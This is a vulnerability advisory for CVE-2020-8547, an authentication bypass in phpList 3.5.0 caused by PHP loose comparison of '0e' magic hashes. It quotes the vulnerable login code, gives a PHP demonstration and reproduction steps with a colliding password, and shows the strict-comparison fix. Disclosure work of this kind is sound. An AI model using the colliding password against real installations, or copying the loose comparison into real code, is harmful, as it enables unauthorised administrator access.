@@ -1,0 +1,90 @@
+# Exploit Title: phpList 3.5.0 - Authentication Bypass
+# Google Dork: N/A
+# Date: 2020-02-03
+# Exploit Author: Suvadip Kar
+# Author Contact: https://twitter.com/spidersec
+# Vendor Homepage: https://www.phplist.org
+# Software Link: https://www.phplist.org/download-phplist/
+# Version: 3.5.0
+# Tested on: Linux
+# CVE : CVE-2020-8547
+
+Background of the Vulnerability :
+
+Php loose comparison '==' compares two operands by converting them to integers even if they are strings.
+
+EXAMPLE CODE:
+
+ <?php
+ var_dump(hash('sha256', 'TyNOQHUS') == '0e66298694359207596086558843543959518835691168370379069085300385');
+ var_dump(hash('sha256', '34250003024812') == '0e66298694359207596086558843543959518835691168370379069085300385');
+ ?>
+
+OUTPUT:
+
+bool(true)
+bool(true)
+
+Vulnerable code:
+
+GITHUB: https://github.com/phpList/phplist3/blob/master/public_html/lists/admin/phpListAdminAuthentication.php
+-----
+if(empty($login)||($password=="")){
+    return array(0, s('Please enter your credentials.'));
+}
+if ($admindata['disabled']) {
+    return array(0, s('your account has been disabled'));
+}
+if (//Password validation.
+    !empty($passwordDB) && $encryptedPass == $passwordDB // Vulnerable because loose comparison is used
+)
+    return array($admindata['id'], 'OK');
+ else {
+    if (!empty($GLOBALS['admin_auth_module'])) {
+        Error(s('Admin authentication has changed, please update your admin module'),
+            'https://resources.phplist.com/documentation/errors/adminauthchange');
+        return;
+        }
+return array(0, s('incorrect password'));
+
+}
+-------
+
+Steps to reproduce:
+
+ 1. Set the string 'TyNOQHUS' as password for username 'admin'. Its sha256 value is 0e66298694359207596086558843543959518835691168370379069085300385.
+
+ 2. Now navigate to endpoint '/admin' and try to login with username 'admin' password 'TyNOQHUS'.
+
+ 3. User Logged in with valid password.
+
+ 4. Now logout from the application and try to login with username 'admin' password '34250003024812'.
+
+ 5. User Logged in, without valid password.
+
+ 6. Authentication bypassed because of PHP loose comparison.
+
+ FIX: This vulnerability can be fixed by using strict comparison (===) in place of loose comparison.
+ -----
+ if(empty($login)||($password=="")){
+     return array(0, s('Please enter your credentials.'));
+ }
+ if ($admindata['disabled']) {
+     return array(0, s('your account has been disabled'));
+ }
+ if (//Password validation.
+     !empty($passwordDB) && $encryptedPass === $passwordDB // Fixed by using strict comparison '==='.
+ )
+     return array($admindata['id'], 'OK');
+  else {
+     if (!empty($GLOBALS['admin_auth_module'])) {
+         Error(s('Admin authentication has changed, please update your admin module'),
+             'https://resources.phplist.com/documentation/errors/adminauthchange');
+         return;
+         }
+ return array(0, s('incorrect password'));
+
+ }
+ -------
+
+Additional Resource: https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf
